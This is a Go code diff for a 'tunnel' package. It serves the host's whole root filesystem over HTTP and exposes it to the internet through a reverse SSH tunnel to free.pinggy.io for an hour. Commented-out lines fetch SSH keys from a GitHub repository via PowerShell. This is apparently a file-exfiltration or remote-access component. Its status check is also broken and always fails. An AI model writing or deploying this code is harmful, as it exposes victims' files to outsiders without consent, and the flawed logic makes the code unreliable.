@@ -2,7 +2,11 @@ package tunnel
 
 import (
 	"bytes"
+	"context"
 	"net/http"
+	"strings"
+	"time"
+
 	//"container/list"
 	"fmt"
 	//"io"
@@ -13,53 +17,73 @@ import (
 
 
 
-var port string = "3333"
+var port string = ":3005"
 var system string = "windows"
 //var logF string = "info.txt"
+var timeToLiveServer time.Duration = 60 //minutes
 
 
-func InitTunne()bool{
+
+type InfoTunnel struct{
+	Status bool
+	Info string
+}
+
+
+func InitTunne()InfoTunnel{
 	
 	var out bytes.Buffer
-	
+	var err bytes.Buffer
 	//var command string = fmt.Sprintf(`ssh -i .\key -T -p 443 -R0:127.0.0.1:%s free.pinggy.io > %s`, port)
-	var command string = fmt.Sprintf(`ssh -i .\key -T -p 443 -R0:127.0.0.1:%s free.pinggy.io > %s`, port)
+	var command string = fmt.Sprintf(`ssh -i ./key -T -p 443 -R0:127.0.0.1%s free.pinggy.io `, port)
 	
-	runTunnel  := commandToRun(system, command)	
-
+	info := make(chan error)
+	//runTunnel  := commandToRun(system, command)	
 	
-	key := existsFile("key")
-	if(!key){
-		var cpKey string = "iwr https://raw.githubusercontent.com/xosuu/messi/refs/heads/main/key -outfile key"
-		var cpKeyPub string = "iwr https://raw.githubusercontent.com/xosuu/messi/refs/heads/main/key.pub -outfile key.pub"
-		copyKey := commandToRun(system, cpKey)
-		copyKeyPub := commandToRun(system, cpKeyPub)
-		exec.Command(copyKey[0], copyKey[1], copyKey[2]).Run()
-		exec.Command(copyKeyPub[0], copyKeyPub[1], copyKeyPub[2]).Run()
-
-	}
+	ui := strings.Split(command, " ")
+	
 
 
-	fmt.Println("Starting tun....")
-	cmd := exec.Command(runTunnel[0], runTunnel[1], runTunnel[2])
+
+	// key := existsFile("key")
+	// if(!key){
+	// 	var cpKey string = "iwr https://raw.githubusercontent.com/xosuu/messi/refs/heads/main/key -outfile key"
+	// 	var cpKeyPub string = "iwr https://raw.githubusercontent.com/xosuu/messi/refs/heads/main/key.pub -outfile key.pub"
+	// 	copyKey := commandToRun(system, cpKey)
+	// 	copyKeyPub := commandToRun(system, cpKeyPub)
+	// 	exec.Command(copyKey[0], copyKey[1], copyKey[2]).Run()
+	// 	exec.Command(copyKeyPub[0], copyKeyPub[1], copyKeyPub[2]).Run()
+
+	// }
+
+
+	fmt.Println("Starting pinggy....")
+	cmd := exec.Command(ui[0], ui[1], ui[2], ui[3], ui[4], ui[5], ui[6], ui[7])
 	cmd.Stdout = &out
-	//stout, err := cmd.StdoutPipe()
-	//if(err != nil){fmt.Println(err)}
+	cmd.Stderr = &err
+	
+	go func () {
+		e := cmd.Run()
+		info <- e
+	}()
+	
+	fmt.Println("Espera... consiguiendo data pinggy.....")
+	time.Sleep(10 * time.Second)
+	
+	if( info  != nil ){
+		return InfoTunnel{Status: false, Info: err.String()}
 
-	er := cmd.Run()
-	if(er != nil){
-		return false
 	}
-	//fmt.Println(string(out.String()))
-	fmt.Print("ok.")
-	return true
+	return InfoTunnel{Status: true, Info: out.String()} 
 }
 
 
 
 func ServerTunn()bool{
 	fmt.Println("start serv...")
-	//s := &http.Server{Addr: ":3009"}
+	server := &http.Server{
+		Addr: port,
+	}
 	
 	resp :=http.FileServer(http.Dir("/"))
 	
@@ -67,13 +91,19 @@ func ServerTunn()bool{
 	
 
 	fmt.Println("INICIANDO SERVER..")
-	err := http.ListenAndServe(":"+port, nil)
-	if(err != nil){
-		fmt.Println(err)
-		return false
-	}
+
+	go func (){
+		server.ListenAndServe()
+	}()
 	
+	fmt.Println("Hecho. server iniciado y programado para apagado")
+	//apagar servidor en 60 minutos
+	time.Sleep(timeToLiveServer * time.Minute)
+	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
+	defer cancel()
+	server.Shutdown(ctx)
 	return true
+
 
 }
 
